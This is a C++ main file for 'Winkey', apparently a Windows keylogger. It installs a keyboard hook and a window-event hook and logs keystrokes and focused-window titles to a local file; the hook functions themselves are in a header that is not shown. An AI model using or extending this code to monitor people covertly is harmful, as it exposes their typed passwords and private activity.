#include "winkey.hpp"

HHOOK g_keyboard_hook;
HWINEVENTHOOK g_windows_hook;
std::ofstream g_log_file;

int main() {
    std::cout << ">>> Winkey <<<" << std::endl;
    
    if (!open_log_file() || !install_keyboard_hook() || !install_windows_hook()) {
        return 1;
    }

    // Log the current focused window title with timestamp
    char window_title[256];
    memset(window_title, 0, sizeof(window_title));
    GetWindowText(GetForegroundWindow(), window_title, sizeof(window_title) - 1);
    log_window_title(window_title);

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook before exiting
    UnhookWindowsHookEx(g_keyboard_hook);

    // Unhook the windows hook before exiting
    UnhookWinEvent(g_windows_hook);

    // Close the log file
    g_log_file.close();

    return 0;
}
